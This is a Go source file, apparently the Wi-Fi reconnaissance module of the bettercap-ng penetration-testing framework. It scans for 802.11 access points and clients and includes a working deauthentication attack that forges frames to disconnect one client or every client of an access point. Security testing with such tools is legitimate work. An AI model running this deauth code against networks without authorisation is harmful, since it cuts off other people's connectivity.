package modules

import (
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/evilsocket/bettercap-ng/core"
	"github.com/evilsocket/bettercap-ng/log"
	"github.com/evilsocket/bettercap-ng/network"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/dustin/go-humanize"
	"github.com/olekukonko/tablewriter"
)

var maxStationTTL = 5 * time.Minute

type WiFiRecon struct {
	session.SessionModule

	handle      *pcap.Handle
	channel     int
	frequencies []int
	apBSSID     net.HardwareAddr
}

func NewWiFiRecon(s *session.Session) *WiFiRecon {
	w := &WiFiRecon{
		SessionModule: session.NewSessionModule("wifi.recon", s),
		channel:       0,
		apBSSID:       nil,
	}

	w.AddHandler(session.NewModuleHandler("wifi.recon on", "",
		"Start 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Start()
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon off", "",
		"Stop 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Stop()
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon MAC", "wifi.recon ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
		"Set 802.11 base station address to filter for.",
		func(args []string) error {
			var err error
			w.Session.WiFi.Clear()
			w.apBSSID, err = net.ParseMAC(args[0])
			return err
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon clear", "",
		"Remove the 802.11 base station filter.",
		func(args []string) error {
			w.Session.WiFi.Clear()
			w.apBSSID = nil
			return nil
		}))

	w.AddHandler(session.NewModuleHandler("wifi.deauth AP-BSSID TARGET-BSSID", `wifi\.deauth ([a-fA-F0-9\s:]+)`,
		"Start a 802.11 deauth attack, while the AP-BSSID is mandatory, if no TARGET-BSSID is specified the deauth will be executed against every connected client.",
		func(args []string) error {
			err := (error)(nil)
			apMac := (net.HardwareAddr)(nil)
			clMac := (net.HardwareAddr)(nil)
			parts := strings.SplitN(args[0], " ", 2)

			if len(parts) == 2 {
				if apMac, err = net.ParseMAC(parts[0]); err != nil {
					return err
				} else if clMac, err = net.ParseMAC(parts[1]); err != nil {
					return err
				}
			} else {
				if apMac, err = net.ParseMAC(parts[0]); err != nil {
					return err
				}
			}

			return w.startDeauth(apMac, clMac)
		}))

	w.AddHandler(session.NewModuleHandler("wifi.show", "",
		"Show current wireless stations list (default sorting by essid).",
		func(args []string) error {
			return w.Show("rssi")
		}))

	w.AddParam(session.NewIntParameter("wifi.recon.channel",
		"",
		"WiFi channel or empty for channel hopping."))

	return w
}

func (w WiFiRecon) Name() string {
	return "wifi.recon"
}

func (w WiFiRecon) Description() string {
	return "A module to monitor and perform wireless attacks on 802.11."
}

func (w WiFiRecon) Author() string {
	return "Gianluca Braga <matrix86@protonmail.com>"
}

func (w *WiFiRecon) getRow(station *network.Station) []string {
	sinceStarted := time.Since(w.Session.StartedAt)
	sinceFirstSeen := time.Since(station.FirstSeen)

	bssid := station.HwAddress
	if sinceStarted > (justJoinedTimeInterval*2) && sinceFirstSeen <= justJoinedTimeInterval {
		// if endpoint was first seen in the last 10 seconds
		bssid = core.Bold(bssid)
	}

	seen := station.LastSeen.Format("15:04:05")
	sinceLastSeen := time.Since(station.LastSeen)
	if sinceStarted > aliveTimeInterval && sinceLastSeen <= aliveTimeInterval {
		// if endpoint seen in the last 10 seconds
		seen = core.Bold(seen)
	} else if sinceLastSeen > presentTimeInterval {
		// if endpoint not  seen in the last 60 seconds
		seen = core.Dim(seen)
	}

	ssid := station.ESSID()
	encryption := station.Encryption
	if encryption == "OPEN" || encryption == "" {
		encryption = core.Green("OPEN")
	}
	sent := ""
	if station.Sent > 0 {
		sent = humanize.Bytes(station.Sent)
	}

	recvd := ""
	if station.Received > 0 {
		recvd = humanize.Bytes(station.Received)
	}

	if w.isApSelected() {
		return []string{
			fmt.Sprintf("%d dBm", station.RSSI),
			bssid,
			station.Vendor,
			strconv.Itoa(mhz2chan(station.Frequency)),
			sent,
			recvd,
			seen,
		}
	} else {
		return []string{
			fmt.Sprintf("%d dBm", station.RSSI),
			bssid,
			ssid,
			station.Vendor,
			encryption,
			strconv.Itoa(mhz2chan(station.Frequency)),
			sent,
			recvd,
			seen,
		}
	}
}

func mhz2chan(freq int) int {
	// ambo!
	if freq <= 2472 {
		return ((freq - 2412) / 5) + 1
	} else if freq == 2484 {
		return 14
	} else if freq >= 5035 && freq <= 5865 {
		return ((freq - 5035) / 5) + 7
	}
	return 0
}

func (w *WiFiRecon) showTable(header []string, rows [][]string) {
	fmt.Println()
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader(header)
	table.SetColWidth(80)
	table.AppendBulk(rows)
	table.Render()
}

func (w *WiFiRecon) isApSelected() bool {
	return w.apBSSID != nil
}

func (w *WiFiRecon) Show(by string) error {
	stations := w.Session.WiFi.List()
	if by == "seen" {
		sort.Sort(ByWiFiSeenSorter(stations))
	} else if by == "essid" {
		sort.Sort(ByEssidSorter(stations))
	} else if by == "channel" {
		sort.Sort(ByChannelSorter(stations))
	} else {
		sort.Sort(ByRSSISorter(stations))
	}

	rows := make([][]string, 0)
	for _, s := range stations {
		rows = append(rows, w.getRow(s))
	}
	nrows := len(rows)

	columns := []string{"RSSI", "BSSID", "SSID", "Vendor", "Encryption", "Channel", "Sent", "Recvd", "Last Seen"}
	if w.isApSelected() {
		// these are clients
		columns = []string{"RSSI", "MAC", "Vendor", "Channel", "Sent", "Received", "Last Seen"}

		if nrows == 0 {
			fmt.Printf("\nNo authenticated clients detected for %s.\n", w.apBSSID.String())
		} else {
			fmt.Printf("\n%s clients:\n", w.apBSSID.String())
		}
	}

	if nrows > 0 {
		w.showTable(columns, rows)
	}

	w.Session.Refresh()

	return nil
}

func (w *WiFiRecon) Configure() error {
	ihandle, err := pcap.NewInactiveHandle(w.Session.Interface.Name())
	if err != nil {
		return err
	}
	defer ihandle.CleanUp()

	if err = ihandle.SetRFMon(true); err != nil {
		return fmt.Errorf("Interface not in monitor mode? %s", err)
	} else if err = ihandle.SetSnapLen(65536); err != nil {
		return err
	} else if err = ihandle.SetTimeout(pcap.BlockForever); err != nil {
		return err
	} else if w.handle, err = ihandle.Activate(); err != nil {
		return err
	} else if err, w.channel = w.IntParam("wifi.recon.channel"); err == nil {
		if err = network.SetInterfaceChannel(w.Session.Interface.Name(), w.channel); err != nil {
			return err
		}
		log.Info("WiFi recon active on channel %d.", w.channel)
	} else {
		w.channel = 0
		// we need to start somewhere, this is just to check if
		// this OS supports switching channel programmatically.
		if err = network.SetInterfaceChannel(w.Session.Interface.Name(), 1); err != nil {
			return err
		}
		log.Info("WiFi recon active with channel hopping.")
	}

	if frequencies, err := network.GetSupportedFrequencies(w.Session.Interface.Name()); err != nil {
		return err
	} else {
		w.frequencies = frequencies
	}

	return nil
}

func (w *WiFiRecon) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64; seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			log.Error("Could not create deauth packet: %s", err)
			continue
		} else if err := w.handle.WritePacketData(pkt); err != nil {
			log.Error("Could not send deauth packet: %s", err)
			continue
		} else {
			time.Sleep(10 * time.Millisecond)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			log.Error("Could not create deauth packet: %s", err)
			continue
		} else if err := w.handle.WritePacketData(pkt); err != nil {
			log.Error("Could not send deauth packet: %s", err)
			continue
		} else {
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func (w *WiFiRecon) startDeauth(apMac net.HardwareAddr, clMac net.HardwareAddr) error {
	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if w.Running() == false {
		if err := w.Configure(); err != nil {
			return err
		}
		defer w.handle.Close()
	}

	// deauth a specific client
	if clMac != nil {
		log.Info("Deauthing client %s from AP %s ...", clMac.String(), apMac.String())
		w.sendDeauthPacket(apMac, clMac)
	} else {
		log.Info("Deauthing clients from AP %s ...", apMac.String())
		// deauth every authenticated client
		for _, station := range w.Session.WiFi.List() {
			if station.IsAP == false {
				w.sendDeauthPacket(apMac, station.HW)
			}
		}
	}

	return nil
}

func (w *WiFiRecon) discoverAccessPoints(radiotap *layers.RadioTap, dot11 *layers.Dot11, packet gopacket.Packet) {
	// search for Dot11InformationElementIDSSID
	if ok, ssid := packets.Dot11ParseIDSSID(packet); ok == true {
		bssid := dot11.Address3.String()
		frequency := int(radiotap.ChannelFrequency)
		w.Session.WiFi.AddIfNew(ssid, bssid, true, frequency, radiotap.DBMAntennaSignal)
	}
}

func (w *WiFiRecon) discoverClients(radiotap *layers.RadioTap, dot11 *layers.Dot11, ap net.HardwareAddr, packet gopacket.Packet) {
	// packet going to this specific BSSID?
	if packets.Dot11IsDataFor(dot11, ap) == true {
		src := dot11.Address2
		frequency := int(radiotap.ChannelFrequency)
		w.Session.WiFi.AddIfNew("", src.String(), false, frequency, radiotap.DBMAntennaSignal)
	}
}

func (w *WiFiRecon) updateStats(dot11 *layers.Dot11, packet gopacket.Packet) {
	// collect stats from data frames
	if dot11.Type.MainType() == layers.Dot11TypeData {
		bytes := uint64(len(packet.Data()))

		dst := dot11.Address1.String()
		if station, found := w.Session.WiFi.Get(dst); found == true {
			station.Received += bytes
		}

		src := dot11.Address2.String()
		if station, found := w.Session.WiFi.Get(src); found == true {
			station.Sent += bytes
		}
	}

	if ok, enc := packets.Dot11ParseEncryption(packet, dot11); ok == true {
		bssid := dot11.Address3.String()
		if station, found := w.Session.WiFi.Get(bssid); found == true {
			station.Encryption = strings.Join(enc, ", ")
		}
	}
}

func (w *WiFiRecon) channelHopper() {
	log.Info("Channel hopper started.")
	for w.Running() == true {
		delay := 250 * time.Millisecond
		// if we have both 2.4 and 5ghz capabilities, we have
		// more channels, therefore we need to increase the time
		// we hop on each one otherwise me lose information
		if len(w.frequencies) > 14 {
			delay = 500 * time.Millisecond
		}

		for _, frequency := range w.frequencies {
			channel := mhz2chan(frequency)
			if err := network.SetInterfaceChannel(w.Session.Interface.Name(), channel); err != nil {
				log.Warning("Error while hopping to channel %d: %s", channel, err)
			}

			time.Sleep(delay)
			if w.Running() == false {
				return
			}
		}
	}
}

func (w *WiFiRecon) stationPruner() {
	log.Debug("WiFi stations pruner started.")
	for w.Running() == true {
		for _, s := range w.Session.WiFi.List() {
			sinceLastSeen := time.Since(s.LastSeen)
			if sinceLastSeen > maxStationTTL {
				log.Debug("Station %s not seen in %s, removing.", s.BSSID(), sinceLastSeen)
				w.Session.WiFi.Remove(s.BSSID())
			}
		}
		time.Sleep(5 * time.Second)
	}
}

func (w *WiFiRecon) Start() error {
	if w.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := w.Configure(); err != nil {
		return err
	}

	w.SetRunning(true, func() {
		// start channel hopper if needed
		if w.channel == 0 {
			go w.channelHopper()
		}

		// start the pruner
		go w.stationPruner()

		defer w.handle.Close()
		src := gopacket.NewPacketSource(w.handle, w.handle.LinkType())
		for packet := range src.Packets() {
			if w.Running() == false {
				break
			}

			// perform initial dot11 parsing and layers validation
			if ok, radiotap, dot11 := packets.Dot11Parse(packet); ok == true {
				// keep collecting traffic statistics
				w.updateStats(dot11, packet)
				// no access point bssid selected, keep scanning for other aps
				if w.isApSelected() == false {
					w.discoverAccessPoints(radiotap, dot11, packet)
				} else {
					// discover stations connected to the selected access point bssid
					w.discoverClients(radiotap, dot11, w.apBSSID, packet)
				}
			}
		}
	})

	return nil
}

func (w *WiFiRecon) Stop() error {
	return w.SetRunning(false, nil)
}
